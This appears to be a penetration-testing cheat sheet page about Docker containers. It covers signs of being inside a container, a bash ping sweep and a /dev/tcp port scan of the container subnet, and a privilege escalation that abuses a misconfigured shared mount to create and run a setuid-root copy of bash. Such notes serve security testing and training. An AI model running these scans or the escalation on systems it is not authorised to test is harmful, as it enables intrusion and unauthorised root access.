---
icon: docker
---

# Docker

{% hint style="info" %}
### <mark style="color:red;">`Enumeration`</mark>

* <mark style="color:purple;">The presence of</mark> <mark style="color:orange;">**`.dockerenv`**</mark> <mark style="color:purple;">in the system root</mark>
* <mark style="color:purple;">Permissions on files show number ids instead of names, this happens when the host users doesn't exist in the</mark> <mark style="color:orange;">**`/passwd`**</mark> <mark style="color:purple;">file from the container</mark>
* <mark style="color:purple;">Docker containers typically run in a private virtual network created by Docker, and the default network uses a subnet in the range</mark> <mark style="color:orange;">**`172.16.0.0/12`**</mark>
* <mark style="color:purple;">No User</mark> <mark style="color:orange;">**`1000`**</mark><mark style="color:purple;">, and the Home Directory Is Mounted.</mark>

***

{% code title="File permissions and ownership" %}
```bash
ls -l
```
{% endcode %}

{% code title="Ping Sweep" overflow="wrap" %}
```bash
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```
{% endcode %}

{% code title="Port Scan" overflow="wrap" %}
```bash
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```
{% endcode %}
{% endhint %}



{% hint style="info" %}
### <mark style="color:red;">**`File Ownership Manipulation via Shared Mounts`**</mark>

* <mark style="color:purple;">Check permissions and ownership when you create a file from host and container:</mark>

{% code lineNumbers="true" %}
```sh
touch from_host
touch from_container
```
{% endcode %}

* <mark style="color:purple;">If the container is miss configured and can creates files as a</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">, and you can access the files created by the host on the container:</mark>&#x20;
  1. <mark style="color:orange;">**`From the host`**</mark><mark style="color:purple;">, copy</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">in to the mounted directory.</mark>
  2. <mark style="color:orange;">**`From the container`**</mark><mark style="color:purple;">, change the ownership and permissions of</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">to</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">.</mark>
  3. <mark style="color:purple;">Execute</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">as</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">.</mark>

{% code overflow="wrap" lineNumbers="true" %}
```bash
cp /bin/bash .
chown root:root bash; chmod 4777 bash
./bash -p
```
{% endcode %}
{% endhint %}

